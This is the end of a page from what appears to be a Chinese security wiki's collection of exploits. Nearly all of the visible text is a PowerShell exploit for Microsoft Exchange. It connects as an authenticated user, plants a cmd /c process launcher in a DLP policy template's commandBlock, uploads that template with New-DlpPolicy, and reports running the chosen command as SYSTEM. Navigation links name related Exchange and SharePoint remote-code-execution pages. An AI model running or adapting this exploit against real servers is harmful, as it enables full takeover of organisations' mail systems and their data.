    <span class="err">$</span><span class="n">s</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ConfigurationName</span> <span class="n">Microsoft</span><span class="o">.</span><span class="n">Exchange</span> <span class="o">-</span><span class="n">ConnectionUri</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="err">$</span><span class="n">server</span><span class="o">/</span><span class="n">PowerShell</span><span class="o">/</span> <span class="o">-</span><span class="n">Authentication</span> <span class="n">Kerberos</span> <span class="o">-</span><span class="n">Credential</span> <span class="err">$</span><span class="n">creds</span>

    <span class="err">$</span><span class="n">xml</span> <span class="o">=</span> <span class="o">@</span><span class="s2">&quot;</span>
<span class="o">&lt;</span><span class="n">dlpPolicyTemplates</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="n">dlpPolicyTemplate</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot;</span> <span class="n">mode</span><span class="o">=</span><span class="s2">&quot;Audit&quot;</span> <span class="n">state</span><span class="o">=</span><span class="s2">&quot;Enabled&quot;</span> <span class="n">version</span><span class="o">=</span><span class="s2">&quot;15.0.2.0&quot;</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">contentVersion</span><span class="o">&gt;</span><span class="mi">4</span><span class="o">&lt;/</span><span class="n">contentVersion</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">publisherName</span><span class="o">&gt;</span><span class="n">si</span><span class="o">&lt;/</span><span class="n">publisherName</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">localizedString</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span><span class="o">&gt;&lt;/</span><span class="n">localizedString</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">name</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">description</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">localizedString</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span><span class="o">&gt;&lt;/</span><span class="n">localizedString</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">description</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">keywords</span><span class="o">&gt;&lt;/</span><span class="n">keywords</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">ruleParameters</span><span class="o">&gt;&lt;/</span><span class="n">ruleParameters</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">policyCommands</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">commandBlock</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="err">!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span> <span class="err">`$</span><span class="n">i</span><span class="o">=</span><span class="n">New</span><span class="o">-</span><span class="nb">object</span> <span class="n">System</span><span class="o">.</span><span class="n">Diagnostics</span><span class="o">.</span><span class="n">ProcessStartInfo</span><span class="p">;</span><span class="err">`$</span><span class="n">i</span><span class="o">.</span><span class="n">UseShellExecute</span><span class="o">=</span><span class="err">`$</span><span class="n">true</span><span class="p">;</span><span class="err">`$</span><span class="n">i</span><span class="o">.</span><span class="n">FileName</span><span class="o">=</span><span class="s2">&quot;cmd&quot;</span><span class="p">;</span><span class="err">`$</span><span class="n">i</span><span class="o">.</span><span class="n">Arguments</span><span class="o">=</span><span class="s2">&quot;/c $cmd&quot;</span><span class="p">;</span><span class="err">`$</span><span class="n">r</span><span class="o">=</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Diagnostics</span><span class="o">.</span><span class="n">Process</span><span class="p">;</span><span class="err">`$</span><span class="n">r</span><span class="o">.</span><span class="n">StartInfo</span><span class="o">=</span><span class="err">`$</span><span class="n">i</span><span class="p">;</span><span class="err">`$</span><span class="n">r</span><span class="o">.</span><span class="n">Start</span><span class="p">()</span> <span class="p">]]</span><span class="o">&gt;</span>
      <span class="o">&lt;/</span><span class="n">commandBlock</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">policyCommands</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">policyCommandsResources</span><span class="o">&gt;&lt;/</span><span class="n">policyCommandsResources</span><span class="o">&gt;</span>
  <span class="o">&lt;/</span><span class="n">dlpPolicyTemplate</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">dlpPolicyTemplates</span><span class="o">&gt;</span><span class="s2">&quot;@</span>

    <span class="err">$</span><span class="n">n</span> <span class="o">=</span> <span class="n">Get</span><span class="o">-</span><span class="n">RandomAlphanumericString</span>
    <span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="err">$</span><span class="n">d</span> <span class="o">=</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="o">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="err">$</span><span class="n">xml</span><span class="p">)</span>
    <span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">Session</span> <span class="err">$</span><span class="n">s</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="p">{</span>
        <span class="n">New</span><span class="o">-</span><span class="n">DlpPolicy</span> <span class="o">-</span><span class="n">Name</span> <span class="err">$</span><span class="n">Using</span><span class="p">:</span><span class="n">n</span> <span class="o">-</span><span class="n">TemplateData</span> <span class="err">$</span><span class="n">Using</span><span class="p">:</span><span class="n">d</span>
    <span class="p">}</span> <span class="o">|</span> <span class="n">Out</span><span class="o">-</span><span class="n">Null</span>
    <span class="s2">&quot;(+) executed $cmd as SYSTEM!&quot;</span>
<span class="p">}</span>

<span class="n">Get</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">|</span> <span class="n">Remove</span><span class="o">-</span><span class="n">PSSession</span>
<span class="n">Exploit</span><span class="o">-</span><span class="n">Exchange</span> <span class="o">-</span><span class="n">server</span> <span class="err">$</span><span class="n">server</span> <span class="o">-</span><span class="n">usr</span> <span class="err">$</span><span class="n">usr</span> <span class="o">-</span><span class="n">pwd</span> <span class="err">$</span><span class="n">pwd</span> <span class="o">-</span><span class="n">cmd</span> <span class="err">$</span><span class="n">cmd</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>